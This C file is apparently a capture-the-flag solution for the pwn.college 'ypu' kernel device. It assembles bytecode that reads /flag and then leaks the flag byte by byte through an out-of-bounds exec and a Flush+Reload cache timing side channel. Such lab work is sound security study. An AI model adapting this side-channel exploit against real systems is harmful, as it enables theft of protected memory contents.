#define _GNU_SOURCE

#include <sys/signal.h>
#include <sys/prctl.h>
#include <sys/ioctl.h>
#include <sys/mman.h>

#include <x86intrin.h>
#include <inttypes.h>
#include <unistd.h>
#include <stdlib.h>
#include <stdio.h>
#include <sched.h>
#include <fcntl.h>
#include <string.h>

// ----------------------------------- uARCH BOILERPLATE -----------------------------------

#define PAGESIZE 0x1000

static size_t threshold = 0;
int leaked_chars = 0;
uint8_t* mem;

void maccess(void *p) { asm volatile("movq (%0), %%rax\n" : : "c"(p) : "rax"); }


__attribute__((noinline))
int flush_reload_t(void *ptr) {
  uint64_t start, end, junk;
  uint32_t tsc;

  _mm_mfence();
  start = __rdtscp(&tsc);
  _mm_mfence();
  maccess(ptr);
  _mm_mfence();
  end = __rdtscp(&tsc);
  _mm_mfence();
  _mm_clflush(ptr);
  _mm_mfence();

  return (int)(end - start);
}

int flush_reload(void *ptr) {
  return flush_reload_t(ptr) < threshold;
}


__attribute__((noinline))
int reload_t(void *ptr) {
  uint64_t start, end, junk;
  uint32_t tsc;

  _mm_mfence();
  start = __rdtscp(&tsc);
  _mm_mfence();
  maccess(ptr);
  _mm_mfence();
  end = __rdtscp(&tsc);
  _mm_mfence();

  return (int)(end - start);
}

void flush_channel(char* code) {
  for(int i = 0; i < 256; i++) {
    _mm_clflush(code + (i * 0x1000));
  }
}

size_t detect_flush_reload_threshold() {
  size_t reload_time = 0, flush_reload_time = 0, i, count = 300;
  size_t ptr[16];

  reload_t(ptr);

  for (i = 0; i < count; i++) {
    reload_time += reload_t(ptr);
  }
  for (i = 0; i < count; i++) {
    flush_reload_time += flush_reload_t(ptr);
  }
  reload_time /= count;
  flush_reload_time /= count;

  return (flush_reload_time + reload_time * 2) / 3;
}

void probe_channel(char* mem, char* leaked, int idx) {
    for(int i = 0; i < 256; i++) {
        int mix_i = ((i * 167) + 13) & 255; // prevent stride prefetcher from screwing with our results
        if(flush_reload(mem + mix_i * PAGESIZE)) {
            if((mix_i >= '.' && mix_i <= '}') && leaked[idx] == ' ') {
                leaked[idx] = mix_i;
                leaked_chars++;
                printf("leaked: %s\n", leaked);
            }
        }
    }
}

void pin_cpu(int cpu) {
    cpu_set_t my_set;
    CPU_ZERO(&my_set);
    CPU_SET(cpu, &my_set);
    sched_setaffinity(0, sizeof(my_set), &my_set);
}

// ----------------------------------- Y85 BOILERPLATE -------------------------------------

#define SPEC_REG_A 0x20
#define SPEC_REG_B 0x40
#define SPEC_REG_C 0x8
#define SPEC_REG_D 0x2
#define SPEC_REG_S 0x4
#define SPEC_REG_I 0x1
#define SPEC_REG_F 0x10

#define INST_IMM 0x20
#define INST_STK 0x40
#define INST_ADD 0x1
#define INST_STM 0x8
#define INST_LDM 0x80
#define INST_JMP 0x10
#define INST_CMP 0x2
#define INST_SYS 0x4

#define SYS_OPEN        0x8
#define SYS_READ_MEMORY 0x20
#define SYS_READ_CODE   0x1
#define SYS_WRITE       0x4
#define SYS_SLEEP       0x2
#define SYS_EXIT        0x10
#define SYS_EXEC     0x40

#define FLAG_L 0x10
#define FLAG_G 0x4
#define FLAG_E 0x1
#define FLAG_N 0x8
#define FLAG_Z 0x2

#define MAX_WORD_VALUE (((0x1ULL << ((sizeof(WORD_TYPE) * 8ULL) - 1ULL)) - 1ULL) | (0xFULL << ((sizeof(WORD_TYPE) * 8ULL) - 4ULL)))
#define CODE_LENGTH 256
#define MEM_LENGTH 256
#define MIN(x,y) x<y ? x : y

#define HEADER_MAGIC 0x00555059 // YPU\0

struct __attribute__((__packed__)) ypu_header {
    unsigned int magic;
    unsigned char entry_point;
    unsigned char reserved;
};

struct instruction_t {
    unsigned char op;
    unsigned char arg1;
    unsigned char arg2;
};

// write "/flag" to mem
void push_flag(struct instruction_t *code, int *ip) {
    int _ip = *ip;
    int idx = 0;
    code[_ip++] = (struct instruction_t){ .op = INST_IMM, .arg1 = SPEC_REG_A, .arg2 = 0x2f };
    code[_ip++] = (struct instruction_t){ .op = INST_IMM, .arg1 = SPEC_REG_B, .arg2 = idx++ };
    code[_ip++] = (struct instruction_t){ .op = INST_STM, .arg1 = SPEC_REG_B, .arg2 = SPEC_REG_A };
    code[_ip++] = (struct instruction_t){ .op = INST_IMM, .arg1 = SPEC_REG_A, .arg2 = 0x66 };
    code[_ip++] = (struct instruction_t){ .op = INST_IMM, .arg1 = SPEC_REG_B, .arg2 = idx++ };
    code[_ip++] = (struct instruction_t){ .op = INST_STM, .arg1 = SPEC_REG_B, .arg2 = SPEC_REG_A };
    code[_ip++] = (struct instruction_t){ .op = INST_IMM, .arg1 = SPEC_REG_A, .arg2 = 0x6c };
    code[_ip++] = (struct instruction_t){ .op = INST_IMM, .arg1 = SPEC_REG_B, .arg2 = idx++ };
    code[_ip++] = (struct instruction_t){ .op = INST_STM, .arg1 = SPEC_REG_B, .arg2 = SPEC_REG_A };
    code[_ip++] = (struct instruction_t){ .op = INST_IMM, .arg1 = SPEC_REG_A, .arg2 = 0x61 };
    code[_ip++] = (struct instruction_t){ .op = INST_IMM, .arg1 = SPEC_REG_B, .arg2 = idx++ };
    code[_ip++] = (struct instruction_t){ .op = INST_STM, .arg1 = SPEC_REG_B, .arg2 = SPEC_REG_A };
    code[_ip++] = (struct instruction_t){ .op = INST_IMM, .arg1 = SPEC_REG_A, .arg2 = 0x67 };
    code[_ip++] = (struct instruction_t){ .op = INST_IMM, .arg1 = SPEC_REG_B, .arg2 = idx++ };
    code[_ip++] = (struct instruction_t){ .op = INST_STM, .arg1 = SPEC_REG_B, .arg2 = SPEC_REG_A };
    *ip = _ip;
}

void sys_open(struct instruction_t *code, int *ip, uint8_t mem, uint8_t flags, uint8_t mode, uint8_t res_reg) {
    int _ip = *ip;
    code[_ip++] = (struct instruction_t){ .op = INST_IMM, .arg1 = SPEC_REG_A, .arg2 = mem };
    code[_ip++] = (struct instruction_t){ .op = INST_IMM, .arg1 = SPEC_REG_B, .arg2 = flags };
    code[_ip++] = (struct instruction_t){ .op = INST_IMM, .arg1 = SPEC_REG_C, .arg2 = mode };
    code[_ip++] = (struct instruction_t){ .op = INST_SYS, .arg1 = SYS_OPEN, .arg2 = res_reg };
    *ip = _ip;
}

void sys_read(struct instruction_t *code, int *ip, uint8_t fd, uint8_t buf, uint8_t count, uint8_t res_reg) {
    int _ip = *ip;
    code[_ip++] = (struct instruction_t){ .op = INST_IMM, .arg1 = SPEC_REG_A, .arg2 = fd };
    code[_ip++] = (struct instruction_t){ .op = INST_IMM, .arg1 = SPEC_REG_B, .arg2 = buf };
    code[_ip++] = (struct instruction_t){ .op = INST_IMM, .arg1 = SPEC_REG_C, .arg2 = count };
    code[_ip++] = (struct instruction_t){ .op = INST_SYS, .arg1 = SYS_READ_MEMORY, .arg2 = res_reg };
    *ip = _ip;
}

void sys_exec(struct instruction_t *code, int *ip, uint8_t addr, uint8_t res_reg) {
    int _ip = *ip;
    code[_ip++] = (struct instruction_t){ .op = INST_IMM, .arg1 = SPEC_REG_A, .arg2 = addr };
    code[_ip++] = (struct instruction_t){ .op = INST_SYS, .arg1 = SYS_EXEC, .arg2 = res_reg };
    *ip = _ip;
}

// ------------------------------------- EXPLOIT ---------------------------------------


void leak_byte(struct instruction_t *code, int ypu_fd, char* leaked, int bidx) {
    // start after header
    int ip = 2;

    // write header
    struct ypu_header header = {0};
    header.magic = HEADER_MAGIC;
    header.entry_point = ip; // start after header

    memcpy((char *)code, (char*)&header, sizeof(struct ypu_header));

    // push flag to mem
    push_flag(code, &ip);

    // sys_open(struct instruction_t *code, int *ip, uint8_t mem, uint8_t flags, uint8_t mode, uint8_t res_reg)
    sys_open(code, &ip, 0, 0, 0, SPEC_REG_A);

    // sys_read(struct instruction_t *code, int *ip, uint8_t fd, uint8_t buf, uint8_t count, uint8_t res_reg)
    sys_read(code, &ip, 0, 129, 55, SPEC_REG_D);

    // crashing inst: invalid register, could be subbed for a sys_exit
    code[ip++] = (struct instruction_t){ .op = INST_IMM, .arg1 = 0x5, .arg2 = 0x5 };

    // flag will get read into mem[ds:0][addr:129] and it'll exit
    int res = ioctl(ypu_fd, 1337);

    // this will be our new entry point
    int loop_ip = ip;
    header.entry_point = loop_ip;
    memcpy((char *)code, (char*)&header, sizeof(struct ypu_header));

    // record this so we can overwrite the instruction later with an OOB address
    int sched_ip = ip;
    sys_exec(code, &ip, 1, SPEC_REG_D);
    code[ip++] = (struct instruction_t){ .op = INST_IMM, .arg1 = 0x5, .arg2 = 0x5 };

    for (int i = 0; i < 80; i++) {
        // use OOB sched for leak
        ip = sched_ip;
        sys_exec(code, &ip, 129+bidx, SPEC_REG_D);

        // flush and get value
        flush_channel((char*)code);
        int res = ioctl(ypu_fd, 1337);
        probe_channel((char*)code, leaked, bidx);
    }
}

int main() {
    //threshold = detect_flush_reload_threshold(); // a little inconsistent...
    threshold = 252; // seems pretty stable
    printf("threshold: %ld\n", threshold);

    //char *pseudo_flag = "pwn.college{YAR63rFoR9Z35QESaOTdK39VYf_.QXxMDNsYjN0EzW}";

    pin_cpu(1);

    int ypu_fd = open("/proc/ypu", O_RDWR);
    printf("ypu %d\n", ypu_fd);

    struct instruction_t* code = mmap(0, 256*0x1000, PROT_READ | PROT_WRITE, MAP_SHARED | MAP_POPULATE, ypu_fd, 0);
    printf("code: %p\n", code);

    int flag_len = 55;
    //int flag_len = 4;
    char leaked[flag_len+1];
    memset(leaked, 0x20, flag_len);
    leaked[flag_len] = 0;

    int i = -1;
    while (leaked_chars < flag_len) {
        i = (i + 1) % flag_len;
        int target = i;
        if (leaked[i] == ' ') {
            leak_byte(code, ypu_fd, leaked, i);
        }
    }
    printf("\n");

    return 0;
}
